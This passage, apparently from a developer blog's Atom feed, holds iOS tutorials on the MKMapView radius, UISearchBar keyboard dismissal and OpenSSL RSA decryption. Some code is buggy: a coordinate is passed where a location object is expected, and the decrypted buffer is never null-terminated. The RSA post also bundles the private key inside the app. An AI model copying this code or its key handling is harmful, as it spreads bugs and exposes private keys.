class="line">&#125;</span><br><span class="line">$content = ob<span class="constructor">_get_contents()</span>;</span><br><span class="line">ob<span class="constructor">_end_clean()</span>;</span><br><span class="line">curl<span class="constructor">_close($<span class="params">ch</span>)</span>;</span><br><span class="line">fclose($<span class="keyword">in</span>);</span><br><span class="line"></span><br><span class="line">$result = json<span class="constructor">_decode($<span class="params">content</span>, 1)</span>;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;This example is to show how to detect user’s country&lt;/p&gt;
&lt;p&gt;For &lt;strong&gt;GET&lt;/strong&gt; request&lt;/p&gt;
&lt;figure class=&quot;highlight</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>iOS - Get the radius of MKMapView</title>
    <link href="http://jslim.net/blog/2013/07/02/ios-get-the-radius-of-mkmapview/"/>
    <id>http://jslim.net/blog/2013/07/02/ios-get-the-radius-of-mkmapview/</id>
    <published>2013-07-02T06:27:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>Some time we might have too much locations want to show to user, unfortunately, it may cause some performance issue if load all locations in one short.</p><p>One of the solution is lazy loading, only load the visible location in map. Thus, in order to achieve this, we need <strong>Center Coordinate</strong> and <strong>“Radius”</strong> <em>(actually it is not radius, but just call it radius)</em></p><p>To get center coordinate</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="built_in">CLLocationCoordinate2D</span>)getCenterCoordinate</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">CLLocationCoordinate2D</span> centerCoor = [<span class="keyword">self</span>.mapView centerCoordinate];</span><br><span class="line">    <span class="keyword">return</span> centerCoor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>For getting radius, depends on where you want to get the 2nd point. Lets take the <strong>Top Center</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="built_in">CLLocationCoordinate2D</span>)getTopCenterCoordinate</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// to get coordinate from CGPoint of your map</span></span><br><span class="line">    <span class="built_in">CLLocationCoordinate2D</span> topCenterCoor = [<span class="keyword">self</span>.mapView convertPoint:<span class="built_in">CGPointMake</span>(<span class="keyword">self</span>.mapView.frame.size.width / <span class="number">2.0</span>f, <span class="number">0</span>) toCoordinateFromView:<span class="keyword">self</span>.mapView];</span><br><span class="line">    <span class="keyword">return</span> topCenterCoor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To get the radius in <strong>meter</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="built_in">CLLocationDistance</span>)getRadius</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">CLLocationCoordinate2D</span> centerCoor = [<span class="keyword">self</span> getCenterCoordinate];</span><br><span class="line">    <span class="comment">// init center location from center coordinate</span></span><br><span class="line">    <span class="built_in">CLLocation</span> *centerLocation = [[<span class="built_in">CLLocation</span> alloc] initWithLatitude:centerCoor.latitude longitude:centerCoor.longitude];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">CLLocationCoordinate2D</span> topCenterCoor = [<span class="keyword">self</span> getTopCenterCoordinate];</span><br><span class="line">    <span class="built_in">CLLocation</span> *topCenterLocation = [[<span class="built_in">CLLocation</span> alloc] initWithLatitude:topCenterCoor.latitude longitude:topCenterCoor.longitude];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CLLocationDistance</span> radius = [centerLocation distanceFromLocation:topCenterCoor];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> radius;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Alternative"><a href="#Alternative" class="headerlink" title="Alternative"></a>Alternative</h3><p>Another way for getting the radius is to apply <strong>Pythagorean theorem</strong>, which is to get 3 points, <strong>Top Left</strong>, <strong>Top Right</strong> and <strong>Center</strong>.</p><p>Then we calculate the 3 distances base on this 3 points</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="built_in">CLLocationDistance</span>)getRadius</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// get center coordinate</span></span><br><span class="line">    <span class="built_in">CLLocationCoordinate2D</span> centerCoor = [<span class="keyword">self</span>.mapView centerCoordinate];</span><br><span class="line">    <span class="built_in">CLLocation</span> *centerLocation = [[<span class="built_in">CLLocation</span> alloc] initWithLatitude:centerCoor.latitude longitude:centerCoor.longitude];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// get top left coordinate</span></span><br><span class="line">    <span class="built_in">CLLocationCoordinate2D</span> topLeftCoor = [<span class="keyword">self</span>.mapView convertPoint:<span class="built_in">CGPointMake</span>(<span class="number">0</span>, <span class="number">0</span>) toCoordinateFromView:<span class="keyword">self</span>.mapView];</span><br><span class="line">    <span class="built_in">CLLocation</span> *topLeftLocation = [[<span class="built_in">CLLocation</span> alloc] initWithLatitude:topLeftCoor.latitude longitude:topLeftCoor.longitude];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// get top right coordinate</span></span><br><span class="line">    <span class="built_in">CLLocationCoordinate2D</span> topRightCoor = [<span class="keyword">self</span>.mapView convertPoint:<span class="built_in">CGPointMake</span>(<span class="keyword">self</span>.mapView.frame.size.width, <span class="number">0</span>) toCoordinateFromView:<span class="keyword">self</span>.mapView];</span><br><span class="line">    <span class="built_in">CLLocation</span> *topRightLocation = [[<span class="built_in">CLLocation</span> alloc] initWithLatitude:topRightCoor.latitude longitude:topRightCoor.longitude];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// the distance from center to top left</span></span><br><span class="line">    <span class="built_in">CLLocationDistance</span> hypotenuse = [centerLocation distanceFromLocation:topLeftLocation];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// half of the distance from top left to top right</span></span><br><span class="line">    <span class="built_in">CLLocationDistance</span> x = [topLeftLocation distanceFromLocation:topRightLocation] / <span class="number">2.0</span>f;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// what we want is this</span></span><br><span class="line">    <span class="built_in">CLLocationDistance</span> y = sqrt(pow(hypotenuse, <span class="number">2.0</span>) - pow(x, <span class="number">2.0</span>));</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;h² = x² + y²&quot;</span>);</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;y² = h² - x²&quot;</span>);</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;y = sqrt(h² - x²)&quot;</span>);</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;%.9f = sqrt(%.9f² - %.9f²)&quot;</span>, y, hypotenuse, x);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/posts/2013-07-02-ios-get-the-radius-of-mkmapview/pythagorean-theorem.png" alt="Pythagorean theorem"></p><p><em>References:</em></p><ul><li><em><a href="http://en.wikipedia.org/wiki/Pythagoras#Pythagorean_theorem">Pythagorean theorem</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Some time we might have too much locations want to show to user, unfortunately, it may cause some performance issue if load all</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>iOS - Handle UISearchBar keyboard show/hide issue</title>
    <link href="http://jslim.net/blog/2013/06/28/ios-handle-uisearchbar-keyboard-show-slash-hide-issue/"/>
    <id>http://jslim.net/blog/2013/06/28/ios-handle-uisearchbar-keyboard-show-slash-hide-issue/</id>
    <published>2013-06-28T05:10:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>I have experienced that when you focus on UISearchBar, the keyboard occupied half of the screen. The question is, “Under what condition should the keyboard hide?”.</p><p>One of the solution is to follow the contact book, which is add an overlay button on top of it.</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="type">void</span>)searchBarTextDidBeginEditing:(<span class="built_in">UISearchBar</span> *)searchBar</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// add the button to the main view</span></span><br><span class="line">    <span class="built_in">UIButton</span> *overlayButton = [[<span class="built_in">UIButton</span> alloc] initWithFrame:<span class="keyword">self</span>.view.frame];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set the background to black and have some transparency</span></span><br><span class="line">    overlayButton.backgroundColor = [<span class="built_in">UIColor</span> colorWithWhite:<span class="number">0</span> alpha:<span class="number">0.3</span>f];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// add an event listener to the button</span></span><br><span class="line">    [overlayButton addTarget:<span class="keyword">self</span> action:<span class="keyword">@selector</span>(hideKeyboard:) forControlEvents:<span class="built_in">UIControlEventTouchUpInside</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// add to main view</span></span><br><span class="line">    [<span class="keyword">self</span>.view addSubview:overlayButton];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)hideKeyboard:(<span class="built_in">UIButton</span> *)sender</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// hide the keyboard</span></span><br><span class="line">    [<span class="keyword">self</span>.searchBar resignFirstResponder];</span><br><span class="line">    <span class="comment">// remove the overlay button</span></span><br><span class="line">    [sender removeFromSuperview];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>So now the keyboard will hide when you touched on the dark area.</p><p>Simple :)</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I have experienced that when you focus on UISearchBar, the keyboard occupied half of the screen. The question is, “Under what condition</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>RSA Decryption on iOS</title>
    <link href="http://jslim.net/blog/2013/06/24/rsa-decryption-on-ios/"/>
    <id>http://jslim.net/blog/2013/06/24/rsa-decryption-on-ios/</id>
    <published>2013-06-24T11:12:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>I’ve been googled for few days and struggling on <strong>“How to decrypt cipher text in iOS”</strong>, unfortunately there is no solution were found.</p><p>Then I decided to do it with C language rather than Objective-C, and I found a <a href="https://github.com/st3fan/ios-openssl">library</a> for openssl that could be included to Xcode.</p><h3 id="Step-1-Install-the-library"><a href="#Step-1-Install-the-library" class="headerlink" title="Step 1: Install the library"></a>Step 1: Install the library</h3><p>Download the library, unzip it then drag the <strong>lib</strong> and <strong>include</strong> folders to your xcode project. Make sure the <strong>Build Settings</strong> -&gt; <strong>Header Search Paths</strong> you have set properly (i.e. “${SRCROOT}/Libraries/openssl/include”)</p><h3 id="Step-2-Add-private-key"><a href="#Step-2-Add-private-key" class="headerlink" title="Step 2: Add private key"></a>Step 2: Add private key</h3><p>Just drag your private key in <strong>pem</strong> format to xcode project.</p><p><strong>If your private key is in binary form, you may <a href="http://www.herongyang.com/Cryptography/keytool-Export-Key-openssl-enc-Command.html">refer here</a>.</strong></p><h3 id="Step-3-Create-a-custom-class"><a href="#Step-3-Create-a-custom-class" class="headerlink" title="Step 3: Create a custom class"></a>Step 3: Create a custom class</h3><p>Create a new class (subclass of NSObject), just named it <strong>Crypto</strong></p><p><strong>Crypto.h</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="string">&lt;Foundation/Foundation.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">Crypto</span> : <span class="title">NSObject</span></span></span><br><span class="line"></span><br><span class="line">- (<span class="built_in">NSString</span> *)decryptFromCipherText:(<span class="built_in">NSString</span> *)cipherText;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><p><strong>Crypto.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/rsa.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/pem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/err.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#import <span class="string">&quot;Crypto.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">Crypto</span> ()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSString</span> *privateKeyPath;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">Crypto</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@synthesize</span> privateKeyPath = _privateKeyPath;</span><br><span class="line"></span><br><span class="line">- (<span class="type">id</span>)init</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">self</span> = [<span class="variable language_">super</span> init])) &#123;</span><br><span class="line">        <span class="comment">// assume the file name is private_key.pem</span></span><br><span class="line">        <span class="keyword">self</span>.privateKeyPath = [[<span class="built_in">NSBundle</span> mainBundle] pathForResource:<span class="string">@&quot;private_key&quot;</span></span><br><span class="line">                                                                   ofType:<span class="string">@&quot;pem&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">self</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="built_in">NSString</span> *)decryptFromCipherText:(<span class="built_in">NSString</span> *)cipherText</span><br><span class="line">&#123;</span><br><span class="line">    RSA *rsa_privateKey = <span class="literal">NULL</span>;</span><br><span class="line">    FILE *fp_privateKey;</span><br><span class="line">    <span class="type">int</span> rsa_private_len;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// read the private key file</span></span><br><span class="line">    <span class="keyword">if</span> ((fp_privateKey = fopen([<span class="keyword">self</span>.privateKeyPath UTF8String], <span class="string">&quot;r&quot;</span>)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;Could not open %@&quot;</span>, <span class="keyword">self</span>.privateKeyPath);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((rsa_privateKey = PEM_read_RSAPrivateKey(fp_privateKey, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;Error loading RSA Private Key File.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp_privateKey);</span><br><span class="line">    </span><br><span class="line">    rsa_private_len = RSA_size(rsa_privateKey);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// make sure you decode the base64 string</span></span><br><span class="line">    <span class="built_in">NSData</span> *decodedData = [Crypto base64DataFromString:cipherText];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// plain text will be stored in this variable</span></span><br><span class="line">    <span class="type">char</span> *decrypted = (<span class="type">unsigned</span> <span class="type">char</span> *)malloc(rsa_private_len - <span class="number">1</span>);</span><br><span class="line">    <span class="type">char</span> *err = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (RSA_private_decrypt([decodedData length], [decodedData bytes], decrypted, rsa_privateKey, RSA_PKCS1_PADDING) == <span class="number">-1</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        ERR_load_CRYPTO_strings();</span><br><span class="line">        fprintf(stderr, <span class="string">&quot;Error %s\n&quot;</span>, ERR_error_string(ERR_get_error(), err));</span><br><span class="line">        fprintf(stderr, <span class="string">&quot;Error %s\n&quot;</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    RSA_free(rsa_privateKey);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// convert the char* to NSString</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">NSString</span> stringWithUTF8String:(<span class="type">char</span> *)decrypted];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// decode the base64 string</span></span><br><span class="line">+ (<span class="built_in">NSData</span> *)base64DataFromString: (<span class="built_in">NSString</span> *)string</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ixtext, lentext;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> ch, inbuf[<span class="number">4</span>], outbuf[<span class="number">3</span>];</span><br><span class="line">    <span class="type">short</span> i, ixinbuf;</span><br><span class="line">    Boolean flignore, flendtext = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="type">unsigned</span> <span class="type">char</span> *tempcstring;</span><br><span class="line">    <span class="built_in">NSMutableData</span> *theData;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (string == <span class="literal">nil</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> [<span class="built_in">NSData</span> data];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ixtext = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    tempcstring = (<span class="keyword">const</span> <span class="type">unsigned</span> <span class="type">char</span> *)[string UTF8String];</span><br><span class="line">    </span><br><span class="line">    lentext = [string length];</span><br><span class="line">    </span><br><span class="line">    theData = [<span class="built_in">NSMutableData</span> dataWithCapacity: lentext];</span><br><span class="line">    </span><br><span class="line">    ixinbuf = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ixtext &gt;= lentext)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        ch = tempcstring [ixtext++];</span><br><span class="line">        </span><br><span class="line">        flignore = <span class="literal">false</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ((ch &gt;= <span class="string">&#x27;A&#x27;</span>) &amp;&amp; (ch &lt;= <span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            ch = ch - <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((ch &gt;= <span class="string">&#x27;a&#x27;</span>) &amp;&amp; (ch &lt;= <span class="string">&#x27;z&#x27;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            ch = ch - <span class="string">&#x27;a&#x27;</span> + <span class="number">26</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((ch &gt;= <span class="string">&#x27;0&#x27;</span>) &amp;&amp; (ch &lt;= <span class="string">&#x27;9&#x27;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            ch = ch - <span class="string">&#x27;0&#x27;</span> + <span class="number">52</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ch = <span class="number">62</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            flendtext = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ch = <span class="number">63</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            flignore = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!flignore)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">short</span> ctcharsinbuf = <span class="number">3</span>;</span><br><span class="line">            Boolean flbreak = <span class="literal">false</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (flendtext)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (ixinbuf == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> ((ixinbuf == <span class="number">1</span>) || (ixinbuf == <span class="number">2</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    ctcharsinbuf = <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    ctcharsinbuf = <span class="number">2</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                ixinbuf = <span class="number">3</span>;</span><br><span class="line">                </span><br><span class="line">                flbreak = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            inbuf [ixinbuf++] = ch;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (ixinbuf == <span class="number">4</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ixinbuf = <span class="number">0</span>;</span><br><span class="line">                </span><br><span class="line">                outbuf[<span class="number">0</span>] = (inbuf[<span class="number">0</span>] &lt;&lt; <span class="number">2</span>) | ((inbuf[<span class="number">1</span>] &amp; <span class="number">0x30</span>) &gt;&gt; <span class="number">4</span>);</span><br><span class="line">                outbuf[<span class="number">1</span>] = ((inbuf[<span class="number">1</span>] &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | ((inbuf[<span class="number">2</span>] &amp; <span class="number">0x3C</span>) &gt;&gt; <span class="number">2</span>);</span><br><span class="line">                outbuf[<span class="number">2</span>] = ((inbuf[<span class="number">2</span>] &amp; <span class="number">0x03</span>) &lt;&lt; <span class="number">6</span>) | (inbuf[<span class="number">3</span>] &amp; <span class="number">0x3F</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ctcharsinbuf; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    [theData appendBytes: &amp;outbuf[i] length: <span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (flbreak)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> theData;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><h3 id="Step-4-Usage"><a href="#Step-4-Usage" class="headerlink" title="Step 4: Usage"></a>Step 4: Usage</h3><p>Refer to my <a href="/blog/2013/01/05/rsa-encryption-in-ios-and-decrypt-it-using-php/">previous blog</a>, encrypt it and get the cipher text, so that you can test here.</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Crypto *crypto = [[Crypto alloc] init];</span><br><span 